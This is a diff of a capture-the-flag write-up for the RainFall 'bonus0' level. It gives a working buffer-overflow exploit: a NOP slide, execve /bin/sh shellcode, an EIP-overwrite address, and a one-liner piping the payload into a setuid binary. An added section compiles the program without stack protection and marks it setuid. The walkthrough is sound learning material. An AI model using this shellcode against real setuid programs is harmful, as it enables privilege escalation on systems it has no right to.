@@ -82,11 +82,11 @@ Breakpoint 1, 0x080484d0 in p ()
 ```
 The buffer starts at ```0xbfffe640```. We will create a large NOP slide leading to our malicious code, so lets overwrite EIP wih an address somewhere on the NOP slide, let's say buffer + 100 ```0xbfffe6a4``` = "\xa4\xe6\xff\xbf".
 
-So we want to craft our first input:
+So we want to craft our first string:
 1. A large NOP slide buffer leading to our malicious code - ```'\x90' * 3000```
 2. our malicious shell code - ```\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80```
 
-And our second input:
+And our second string:
 1. A buffer until we reach EIP - ```'B' * 14```
 2. Address on NOP slide leading to our malicious code - ```\xa4\xe6\xff\xbf```
 3. buffer single byte - ```'B'```
@@ -105,6 +105,28 @@ cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
 ```
 Here is a handy one liner:
 ```
-(python -c "print('\x90' * 3000 + 
-'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')"; python -c "print('B' * 14 + '\xa4\xe6\xff\xbf' + 'B')"; cat) | ~/bonus0
+(python -c "print('\x90' * 3000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')"; python -c "print('B' * 14 + '\xa4\xe6\xff\xbf' + 'B')"; cat) | ~/bonus0
 ```
+
+## Recreate Exploited Binary
+
+As user ```bonus1```, in ```/tmp```, create and compile ```bonus0_source.c```
+```
+bonus1@RainFall:/tmp$ gcc bonus0_source.c -fno-stack-protector -z execstack -o bonus0_source
+```
+Edit permissions including suid, then move the binary to home directory.
+```
+bonus1@RainFall:/tmp$ chmod u+s bonus0_source; chmod +wx ~; mv bonus0_source ~
+```
+Exit back to user ```bonus0```, then pipe our exploit into the source. Luckily, p()'s buffer address is similar, so the return address doesn't need updating.
+```
+bonus1@RainFall:/tmp$ exit
+exit
+bonus0@RainFall:~$ (python -c "print('\x90' * 3000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')"; python -c "print('B' * 14 + '\xa4\xe6\xff\xbf' + 'B')"; cat) | /home/user/bonus1/bonus0_source
+ -
+ -
+��������������������BBBBBBBBBBBBBB����B BBBBBBBBBBBBBB����B
+whoami
+bonus1
+```
+
